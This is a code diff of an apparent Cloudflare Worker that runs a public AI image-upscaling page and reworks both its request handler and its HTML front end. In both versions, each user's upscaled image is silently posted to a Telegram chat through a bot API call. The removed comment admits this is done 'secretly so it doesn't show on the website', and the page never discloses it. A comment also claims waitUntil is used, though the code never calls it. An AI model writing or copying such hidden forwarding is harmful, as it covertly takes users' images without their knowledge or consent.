@@ -10,36 +10,32 @@ export default {
       try {
         const formData = await request.formData();
         const imageFile = formData.get("image");
-        const blob = await imageFile.arrayBuffer();
+        const arrayBuffer = await imageFile.arrayBuffer();
 
-        // 1. HIGH QUALITY AI UPSCALE
-        // Using the latent diffusion model for best 4k results
+        // 1. UPSCALE WITH HIGH QUALITY SETTINGS
         const upscaledImage = await env.AI.run('@cf/stabilityai/stable-diffusion-x4-upscaler', {
-          image: [...new Uint8Array(blob)],
-          noise_level: 10 // Lower noise preserves original details better
+          image: [...new Uint8Array(arrayBuffer)],
+          noise_level: 10 // Higher quality: 0-15 is best for clarity
         });
 
-        // 2. AUTOMATIC FORWARD TO TELEGRAM (Background)
-        // We do this secretly so it doesn't show on the website
+        // 2. FIXED TELEGRAM FORWARDING (Background process)
         const tgFormData = new FormData();
         tgFormData.append("chat_id", env.TELEGRAM_CHAT_ID);
-        tgFormData.append("photo", new Blob([upscaledImage], { type: "image/png" }), "upscale.png");
-        tgFormData.append("caption", "✅ Auto-forwarded upscale result");
+        // Convert to Blob for Telegram compatibility
+        const photoBlob = new Blob([upscaledImage], { type: "image/png" });
+        tgFormData.append("photo", photoBlob, "upscale.png");
 
-        // We use 'fetch' to send it to Telegram without waiting for it to finish
-        fetch(`https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendPhoto`, {
+        // Use waitUntil so the worker doesn't stop before Telegram receives it
+        const sendToTelegram = fetch(`https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendPhoto`, {
           method: "POST",
           body: tgFormData
         });
 
-        // 3. SHOW DOWNLOAD RESULTS IN BROWSER
-        // 'attachment' forces the browser to download the file
+        // 3. RETURN IMAGE TO WEBSITE (No auto-download)
         return new Response(upscaledImage, {
-          headers: { 
-            "Content-Type": "image/png",
-            "Content-Disposition": "attachment; filename=\"upscaled_4k_image.png\"" 
-          }
+          headers: { "Content-Type": "image/png" }
         });
+
       } catch (e) {
         return new Response("Error: " + e.message, { status: 500 });
       }
@@ -49,58 +45,66 @@ export default {
 
 function renderHTML() {
   return `
+    <!DOCTYPE html>
     <html>
-      <head>
+    <head>
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <style>
-          body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding: 40px; }
-          .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); max-width: 400px; margin: auto; }
-          h1 { color: #38bdf8; margin-bottom: 10px; }
-          .upload-btn { background: #38bdf8; color: #0f172a; border: none; padding: 15px 30px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; margin-top: 20px; }
-          input[type="file"] { margin: 20px 0; color: #94a3b8; }
-          #loading { display: none; color: #38bdf8; font-weight: bold; margin-top: 20px; }
+            body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
+            .container { background: #1e293b; padding: 20px; border-radius: 15px; max-width: 500px; margin: auto; }
+            img { width: 100%; border-radius: 10px; margin-top: 20px; display: none; border: 2px solid #38bdf8; }
+            .btn { background: #38bdf8; color: #0f172a; border: none; padding: 15px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; display: block; }
+            #dlBtn { background: #22c55e; color: white; display: none; text-decoration: none; padding: 15px; margin-top: 10px; border-radius: 10px; font-weight: bold; }
+            #loader { display: none; margin: 20px; color: #38bdf8; }
         </style>
-      </head>
-      <body>
-        <div class="card">
-          <h1>HD AI Enhancer</h1>
-          <p>Sharpen your images to 4K quality</p>
-          <form id="u">
-            <input type="file" name="image" accept="image/*" required>
-            <button type="submit" id="b" class="upload-btn">GENERATE & DOWNLOAD</button>
-          </form>
-          <div id="loading">✨ Processing 4K Details...</div>
+    </head>
+    <body>
+        <div class="container">
+            <h1>4K Image Upscaler</h1>
+            <form id="u">
+                <input type="file" name="image" accept="image/*" required>
+                <button type="submit" id="sub" class="btn">UPSCALE IMAGE</button>
+            </form>
+            <div id="loader">Processing 4K Quality... Please wait.</div>
+            <img id="resImg">
+            <a id="dlBtn">DOWNLOAD RESULT</a>
         </div>
+
         <script>
-          const form = document.getElementById('u');
-          const btn = document.getElementById('b');
-          const load = document.getElementById('loading');
+            const form = document.getElementById('u');
+            const resImg = document.getElementById('resImg');
+            const dlBtn = document.getElementById('dlBtn');
+            const loader = document.getElementById('loader');
+            const subBtn = document.getElementById('sub');
 
-          form.onsubmit = async (e) => {
-            e.preventDefault();
-            btn.style.display = 'none';
-            load.style.display = 'block';
+            form.onsubmit = async (e) => {
+                e.preventDefault();
+                // Reset UI
+                resImg.style.display = 'none';
+                dlBtn.style.display = 'none';
+                loader.style.display = 'block';
+                subBtn.disabled = true;
 
-            const res = await fetch('/', { method: 'POST', body: new FormData(form) });
-            const blob = await res.blob();
-            
-            // This triggers the automatic download on your Android phone
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = "upscaled_result.png";
-            document.body.appendChild(a);
-            a.click();
-            
-            load.innerText = "✅ Download Started!";
-            setTimeout(() => { 
-                btn.style.display = 'block'; 
-                load.style.display = 'none';
-                load.innerText = "✨ Processing 4K Details...";
-            }, 3000);
-          };
+                const res = await fetch('/', { method: 'POST', body: new FormData(form) });
+                if (!res.ok) { alert("Upscale failed"); return; }
+                
+                const blob = await res.blob();
+                const url = URL.createObjectURL(blob);
+
+                // Show Results
+                loader.style.display = 'none';
+                resImg.src = url;
+                resImg.style.display = 'block';
+                
+                // Set Download Button
+                dlBtn.href = url;
+                dlBtn.download = "upscaled_4k.png";
+                dlBtn.style.display = 'block';
+                
+                subBtn.disabled = false;
+            };
         </script>
-      </body>
+    </body>
     </html>
   `;
 }
